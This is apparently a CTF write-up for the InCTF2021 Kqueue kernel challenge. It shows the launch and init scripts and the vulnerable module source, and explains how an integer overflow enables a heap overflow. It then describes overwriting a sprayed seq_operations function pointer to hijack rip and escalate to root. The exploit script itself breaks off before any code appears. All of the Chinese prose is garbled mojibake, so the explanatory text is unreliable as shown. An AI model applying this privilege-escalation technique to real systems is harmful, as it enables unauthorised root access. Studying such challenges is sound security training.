<h2 id="heap-overflow"><a href="#heap-overflow" class="headerlink" title="heap-overflow"></a>heap-overflow</h2><p>å°±åƒç”¨æˆ·æ€çš„å †æº¢å‡ºå¯ä»¥è¿›è¡Œæ¼æ´åˆ©ç”¨ï¼ŒåŒæ ·çš„å†…æ ¸æ€çš„ä¸Šå †æº¢å‡ºä¹Ÿå¯ä»¥è¿›è¡Œæ¼æ´åˆ©ç”¨ï¼Œå†…æ ¸æ€çš„å †æ˜¯é€šè¿‡slub/slabè¿›è¡Œç®¡ç†çš„ï¼Œä»–æŠŠç©ºé—²é˜Ÿåˆ—ä»¥é“¾è¡¨çš„å½¢å¼ç»„ç»‡ï¼Œæ‰€ä»¥åœ¨æˆ‘ç°åœ¨è®¤ä¸ºå †æº¢å‡ºä¸€å…±æœ‰ä¸¤ç§åˆ©ç”¨æ–¹å¼ï¼Œä¸€ç§æ˜¯é€šè¿‡æº¢å‡ºè¦†ç›–ä¸‹ä¸€ä¸ªå †çš„nextæ¥è¾¾åˆ°ä»»æ„åœ°å€ç”³è¯·ï¼Œå¦ä¸€ç§æ˜¯<code>heap spray</code>,æˆ‘ä»¬å¯ä»¥åˆ©ç”¨å†…æ ¸æœ¬èº«çš„ä¸€äº›ç»“æ„ä½“ï¼Œè¿™äº›ç»“æ„ä½“é‡Œæœ‰å‡½æ•°æŒ‡é’ˆï¼Œé€šè¿‡æº¢å‡ºå¯ä»¥è¦†ç›–åˆ°å‡½æ•°æŒ‡é’ˆï¼Œè¿›è€Œè¿›è¡Œripçš„åŠ«æŒã€‚</p>
<h3 id="ä¾‹é¢˜ï¼šInCTF2021-Kqueue"><a href="#ä¾‹é¢˜ï¼šInCTF2021-Kqueue" class="headerlink" title="ä¾‹é¢˜ï¼šInCTF2021 - Kqueue"></a>ä¾‹é¢˜ï¼šInCTF2021 - Kqueue</h3><p><strong>å¯åŠ¨è„šæœ¬</strong></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">-cpu kvm64 \</span><br><span class="line">-m 512 \</span><br><span class="line">-nographic \</span><br><span class="line">-kernel  ./bzImage \</span><br><span class="line">-append <span class="string">&quot;console=ttyS0 panic=-1 pti=off kaslr quiet&quot;</span> \</span><br><span class="line">-monitor /dev/null \</span><br><span class="line">-initrd ./rootfs.cpio \</span><br><span class="line">-net user \</span><br><span class="line">-net nic</span><br></pre></td></tr></table></figure>

<p>é€šè¿‡è„šæœ¬å¯çŸ¥cpuä½¿ç”¨äº†kvmè¿›è¡Œè™šæ‹Ÿï¼Œè™šæ‹Ÿæœºå¼€äº†kaslr,æ²¡å¼€kpti</p>
<p><strong>æ–‡ä»¶ç³»ç»Ÿå¯åŠ¨è„šæœ¬</strong></p>
<p>ç”±äºé¢˜ç›®çš„æ–‡ä»¶ç³»ç»Ÿç”±buildrootæ„å»ºï¼Œæˆ‘ä¸æ˜¯å¾ˆæ‡‚ï¼Œæ‰€ä»¥æ¢äº†ä¸ªæ–‡ä»¶ç³»ç»Ÿï¼Œä¸å½±å“åšé¢˜ï¼Œå°±æ˜¯åŠ è½½å®Œè‡ªå†™å†…æ ¸æ¨¡å—ç„¶åè®¾ç½®æƒé™ã€‚</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;IF8gIF9fICAgICAgICAgICAgICAgXyAgICAgICAgICBfICAgICAKfCB8LyAvX19fICBfX18gXyBfXyB8IHwgICAgX18gX3wgfF9fICAKfCAnIC8vIF8gXC8gXyBcICdfIFx8IHwgICAvIF9gIHwgJ18gXCAKfCAuIFwgIF9fLyAgX18vIHwgfCB8IHxfX3wgKF98IHwgfF8pIHwKfF98XF9cX19ffFxfX198X3wgfF98X19fX19cX18sX3xfLl9fLyAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAK&quot;</span> | base64 -d</span><br><span class="line"></span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">mkdir /dev/pts</span><br><span class="line">mount /dev/pts</span><br><span class="line"></span><br><span class="line">insmod /home/pwn/baby.ko</span><br><span class="line">chmod 644 /dev/kqueue</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line"><span class="built_in">cd</span> /home/pwn</span><br><span class="line">setsid cttyhack setuidgid 1000 sh</span><br><span class="line">umount /proc</span><br><span class="line">poweroff -f</span><br></pre></td></tr></table></figure>

<p><strong>å†…æ ¸æ¨¡å—</strong></p>
<p>é¢˜ç›®ç›´æ¥ç»™äº†æºç ï¼Œå¯ä»¥ç›´æ¥é˜…è¯»æºç ï¼Œé€šè¿‡é˜…è¯»æºç å¯ä»¥é€†å‡ºè¿™ä¸ªkoæ¨¡å—åœ¨å†…æ ¸å®ç°äº†ä¸€ç§é˜Ÿåˆ—ç®¡ç†ï¼ˆç§ä»¥ä¸ºä¸æ˜¯å¾ˆå†™çš„ä¸æ˜¯å¾ˆé«˜æ•ˆï¼‰ï¼Œè¿™æ˜¯<code>ioctl()</code>å‡½æ•°æºç </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> noinline <span class="keyword">long</span> <span class="title">kqueue_ioctl</span><span class="params">(struct file *file, <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">long</span> result;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">request_t</span> request;</span><br><span class="line">    </span><br><span class="line">    mutex_lock(&amp;operations_lock);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (copy_from_user((<span class="keyword">void</span> *)&amp;request, (<span class="keyword">void</span> *)arg, <span class="keyword">sizeof</span>(<span class="keyword">request_t</span>)))&#123;</span><br><span class="line">        err(<span class="string">&quot;[-] copy_from_user failed&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span>(cmd)&#123;</span><br><span class="line">        <span class="keyword">case</span> CREATE_KQUEUE:</span><br><span class="line">            result = create_kqueue(request);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> DELETE_KQUEUE:</span><br><span class="line">            result = delete_kqueue(request);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> EDIT_KQUEUE:</span><br><span class="line">            result = edit_kqueue(request);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> SAVE:</span><br><span class="line">            result = save_kqueue_entries(request);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            result = INVALID;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">ret: </span><br><span class="line">    mutex_unlock(&amp;operations_lock);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¼ å…¥ä¸åŒçš„cmdæ‰§è¡Œä¸åŒçš„å‡½æ•°ï¼Œè¿™äº›å‡½æ•°çœ‹åˆ°å‡½æ•°åå°±èƒ½çŸ¥é“æ˜¯å¹²å•¥çš„ï¼Œéå¸¸å¥‡æ€ªçš„æ˜¯ä»–ä¼šå¯¹ä¼ å…¥çš„<code>request</code>ç»“æ„ä½“è¿›è¡Œæ£€æŸ¥ï¼Œå¦‚æœä¸ç¬¦åˆè¦æ±‚å°±ä¼šæ‰§è¡Œ<code>err</code>å‡½æ•°ï¼Œä½†æ˜¯è¿™ä¸ªå‡½æ•°ä¸ä¼šexit()ï¼Œæ‰€ä»¥æ£€æŸ¥ç›¸å½“äºæ²¡æ£€æŸ¥.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span> <span class="title">err</span><span class="params">(<span class="keyword">char</span>* msg)</span></span>&#123;</span><br><span class="line">    printk(KERN_ALERT <span class="string">&quot;%s\n&quot;</span>,msg);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­æ¯”è¾ƒé‡è¦çš„å°±æ˜¯<code>create_kqueue()</code>å‡½æ•°å’Œ<code>save_kqueue_entries()</code>å‡½æ•°</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> noinline <span class="keyword">long</span> <span class="title">create_kqueue</span><span class="params">(<span class="keyword">request_t</span> request)</span></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> result = INVALID;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(queueCount &gt; MAX_QUEUES)</span><br><span class="line">        err(<span class="string">&quot;[-] Max queue count reached&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* You can&#x27;t ask for 0 queues , how meaningless */</span></span><br><span class="line">    <span class="keyword">if</span>(request.max_entries&lt;<span class="number">1</span>)</span><br><span class="line">        err(<span class="string">&quot;[-] kqueue entries should be greater than 0&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Asking for too much is also not good */</span></span><br><span class="line">    <span class="keyword">if</span>(request.data_size&gt;MAX_DATA_SIZE)</span><br><span class="line">        err(<span class="string">&quot;[-] kqueue data size exceed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Initialize kqueue_entry structure */</span></span><br><span class="line">    queue_entry *kqueue_entry;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check if multiplication of 2 64 bit integers results in overflow */</span></span><br><span class="line">    ull space = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(__builtin_umulll_overflow(<span class="keyword">sizeof</span>(queue_entry),(request.max_entries+<span class="number">1</span>),&amp;space) == <span class="literal">true</span>)</span><br><span class="line">        err(<span class="string">&quot;[-] Integer overflow&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Size is the size of queue structure + size of entry * request entries */</span></span><br><span class="line">    ull queue_size = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(__builtin_saddll_overflow(<span class="keyword">sizeof</span>(<span class="built_in">queue</span>),space,&amp;queue_size) == <span class="literal">true</span>)</span><br><span class="line">        err(<span class="string">&quot;[-] Integer overflow&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Total size should not exceed a certain limit */</span></span><br><span class="line">    <span class="keyword">if</span>(queue_size&gt;<span class="keyword">sizeof</span>(<span class="built_in">queue</span>) + <span class="number">0x10000</span>)</span><br><span class="line">        err(<span class="string">&quot;[-] Max kqueue alloc limit reached&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* All checks done , now call kzalloc */</span></span><br><span class="line">    <span class="built_in">queue</span> *<span class="built_in">queue</span> = validate((<span class="keyword">char</span> *)kmalloc(queue_size,GFP_KERNEL));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Main queue can also store data */</span></span><br><span class="line">    <span class="built_in">queue</span>-&gt;data = validate((<span class="keyword">char</span> *)kmalloc(request.data_size,GFP_KERNEL));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Fill the remaining queue structure */</span></span><br><span class="line">    <span class="built_in">queue</span>-&gt;data_size   = request.data_size;</span><br><span class="line">    <span class="built_in">queue</span>-&gt;max_entries = request.max_entries;</span><br><span class="line">    <span class="built_in">queue</span>-&gt;queue_size  = queue_size;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Get to the place from where memory has to be handled */</span></span><br><span class="line">    kqueue_entry = (queue_entry *)((<span class="keyword">uint64_t</span>)(<span class="built_in">queue</span> + (<span class="keyword">sizeof</span>(<span class="built_in">queue</span>)+<span class="number">1</span>)/<span class="number">8</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Allocate all kqueue entries */</span></span><br><span class="line">    queue_entry* current_entry = kqueue_entry;</span><br><span class="line">    queue_entry* prev_entry = current_entry;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint32_t</span> i=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;request.max_entries+<span class="number">1</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(i!=request.max_entries)</span><br><span class="line">            prev_entry-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">        current_entry-&gt;idx = i;</span><br><span class="line">        current_entry-&gt;data = (<span class="keyword">char</span> *)(validate((<span class="keyword">char</span> *)kmalloc(request.data_size,GFP_KERNEL)));</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Increment current_entry by size of queue_entry */</span></span><br><span class="line">        current_entry += <span class="keyword">sizeof</span>(queue_entry)/<span class="number">16</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Populate next pointer of the previous entry */</span></span><br><span class="line">        prev_entry-&gt;next = current_entry;</span><br><span class="line">        prev_entry = prev_entry-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Find an appropriate slot in kqueues */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;MAX_QUEUES;j++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(kqueues[j] == <span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(j&gt;MAX_QUEUES)</span><br><span class="line">        err(<span class="string">&quot;[-] No kqueue slot left&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Assign the newly created kqueue to the kqueues */</span></span><br><span class="line">    kqueues[j] = <span class="built_in">queue</span>;</span><br><span class="line">    queueCount++;</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> noinline <span class="keyword">long</span> <span class="title">delete_kqueue</span><span class="params">(<span class="keyword">request_t</span> request)</span></span>&#123;</span><br><span class="line">    <span class="comment">/* Check for out of bounds requests */</span></span><br><span class="line">    <span class="keyword">if</span>(request.queue_idx&gt;MAX_QUEUES)</span><br><span class="line">        err(<span class="string">&quot;[-] Invalid idx&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check for existence of the request kqueue */</span></span><br><span class="line">    <span class="built_in">queue</span> *<span class="built_in">queue</span> = kqueues[request.queue_idx];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">queue</span>)</span><br><span class="line">        err(<span class="string">&quot;[-] Requested kqueue does not exist&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    kfree(<span class="built_in">queue</span>);</span><br><span class="line">    <span class="built_in">memset</span>(<span class="built_in">queue</span>,<span class="number">0</span>,<span class="built_in">queue</span>-&gt;queue_size);</span><br><span class="line">    kqueues[request.queue_idx] = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Now you have the option to safely preserve your precious kqueues */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> noinline <span class="keyword">long</span> <span class="title">save_kqueue_entries</span><span class="params">(<span class="keyword">request_t</span> request)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check for out of bounds queue_idx requests */</span></span><br><span class="line">    <span class="keyword">if</span>(request.queue_idx &gt; MAX_QUEUES)</span><br><span class="line">        err(<span class="string">&quot;[-] Invalid kqueue idx&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check if queue is already saved or not */</span></span><br><span class="line">    <span class="keyword">if</span>(isSaved[request.queue_idx]==<span class="literal">true</span>)</span><br><span class="line">        err(<span class="string">&quot;[-] Queue already saved&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">queue</span> *<span class="built_in">queue</span> = validate(kqueues[request.queue_idx]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check if number of requested entries exceed the existing entries */</span></span><br><span class="line">    <span class="keyword">if</span>(request.max_entries &lt; <span class="number">1</span> || request.max_entries &gt; <span class="built_in">queue</span>-&gt;max_entries)</span><br><span class="line">        err(<span class="string">&quot;[-] Invalid entry count&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Allocate memory for the kqueue to be saved */</span></span><br><span class="line">    <span class="keyword">char</span> *new_queue = validate((<span class="keyword">char</span> *)kzalloc(<span class="built_in">queue</span>-&gt;queue_size,GFP_KERNEL));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Each saved entry can have its own size */</span></span><br><span class="line">    <span class="keyword">if</span>(request.data_size &gt; <span class="built_in">queue</span>-&gt;queue_size)</span><br><span class="line">        err(<span class="string">&quot;[-] Entry size limit exceed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Copy main&#x27;s queue&#x27;s data */</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">queue</span>-&gt;data &amp;&amp; request.data_size)</span><br><span class="line">        validate(<span class="built_in">memcpy</span>(new_queue,<span class="built_in">queue</span>-&gt;data,request.data_size));</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        err(<span class="string">&quot;[-] Internal error&quot;</span>);</span><br><span class="line">    new_queue += <span class="built_in">queue</span>-&gt;data_size;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Get to the entries of the kqueue */</span></span><br><span class="line">    queue_entry *kqueue_entry = (queue_entry *)(<span class="built_in">queue</span> + (<span class="keyword">sizeof</span>(<span class="built_in">queue</span>)+<span class="number">1</span>)/<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* copy all possible kqueue entries */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> i=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;request.max_entries+<span class="number">1</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!kqueue_entry || !kqueue_entry-&gt;data)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span>(kqueue_entry-&gt;data &amp;&amp; request.data_size)</span><br><span class="line">            validate(<span class="built_in">memcpy</span>(new_queue,kqueue_entry-&gt;data,request.data_size));</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            err(<span class="string">&quot;[-] Internal error&quot;</span>);</span><br><span class="line">        kqueue_entry = kqueue_entry-&gt;next;</span><br><span class="line">        new_queue += <span class="built_in">queue</span>-&gt;data_size;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Mark the queue as saved */</span></span><br><span class="line">    isSaved[request.queue_idx] = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åœ¨<code>creat_kqueue</code>ä¸­å­˜åœ¨ä¸€ä¸ªä¸€ä¸ªæ•´æ•°æº¢å‡º<code>__builtin_umulll_overflow(sizeof(queue_entry),(request.max_entries+1),&amp;space)</code>,<code>request.max_entries</code>æ˜¯ä¸€ä¸ªuint32_tå˜é‡ï¼Œæ‰€ä»¥å¦‚æœä¼ å…¥çš„æ˜¯0xffffffff,æ‹¿ç›¸åŠ å°±ä¼šå˜æˆ0ï¼Œç„¶ååœ¨<code>save_kqueue</code>ä¸­å­˜åœ¨<code>validate(memcpy(new_queue,queue-&gt;data,request.data_size));</code>ï¼Œå¦‚æœåœ¨<code>create_kqueue</code>ä¸­æ•´æ•°æº¢å‡ºäº†ï¼Œé‚£è¿™é‡Œçš„<code>new_queue</code>å°±æ˜¯ä¸€ä¸ª<code>queue</code>å¤§å°æ˜¯0x20,ä½†æ˜¯memcpyçš„å¤§å°æ˜¯æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„ï¼Œæ‰€ä»¥åˆ°äº†è¿™æ­¥å°±å¯ä»¥æº¢å‡º0x20çš„å †äº†ï¼Œæº¢å‡º0x20çš„å †æ”¹æ€ä¹ˆåˆ©ç”¨å‘¢ã€‚è¿™é‡Œå°±ç”¨åˆ°äº†ç¬¬äºŒç§æ€è·¯ã€‚</p>
<p>å½“æ‰“å¼€ä¸€ä¸ªstatæ–‡ä»¶æ¯”å¦‚(â€œ/proc/self/statâ€)çš„æ—¶å€™å°±ä¼šåœ¨å†…æ ¸åˆ†é…ä¸€ä¸ª<code>seq_operations</code>ç»“æ„ä½“ï¼Œè¿™ä¸ªç»“æ„ä½“çš„å¤§å°æ˜¯0x20,è®°å½•ç€å››ä¸ªå‡½æ•°æŒ‡é’ˆ,å½“æˆ‘ä»¬å‘statä½¿ç”¨readå‡½æ•°è¯»çš„æ—¶å€™å°±ä¼šæ‰§è¡Œ<code>seq_operations</code>ç»“æ„ä½“çš„startå‡½æ•°æŒ‡é’ˆï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨å †å–·è®©è¿™ä¸ªç»“æ„ä½“ç½®äº<code>new_queue</code>å †å—çš„ä¸‹é¢ï¼Œç„¶åæº¢å‡ºè¦†ç›–ç¬¬ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆï¼Œæœ€åread(seq_fd,data,0x20)å°±å¯ä»¥åŠ«æŒripäº†ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seq_operations</span> &#123;</span></span><br><span class="line">    <span class="keyword">void</span> * (*start) (struct seq_file *m, <span class="keyword">loff_t</span> *pos);</span><br><span class="line">    <span class="keyword">void</span> (*stop) (struct seq_file *m, <span class="keyword">void</span> *v);</span><br><span class="line">    <span class="keyword">void</span> * (*next) (struct seq_file *m, <span class="keyword">void</span> *v, <span class="keyword">loff_t</span> *pos);</span><br><span class="line">    <span class="keyword">int</span> (*show) (struct seq_file *m, <span class="keyword">void</span> *v);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>ç”±äºæ²¡æœ‰å¼€smepæ‰€ä»¥å¯ä»¥ç›´æ¥æŠŠripåŠ«æŒåˆ°ç”¨æˆ·æ€ï¼Œä½†æ³¨æ„æ­¤æ—¶çš„æ ˆä¾æ—§åœ¨å†…æ ¸ä¸Šï¼Œé‡Œé¢æœ‰å†…æ ¸ä»£ç åœ°å€ä¿¡æ¯ï¼Œå¯ä»¥é€šè¿‡å†™shellcodeä»æ ˆä¸Šå¾—åˆ°<code>commit_creds</code>å’Œ<code>prepare_kernel_cred</code>åœ°å€ï¼Œç„¶åææƒåè¿”å›ç”¨æˆ·æ€getshell</p>
<h4 id="è„šæœ¬"><a href="#è„šæœ¬" class="headerlink" title="è„šæœ¬"></a>è„šæœ¬</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span 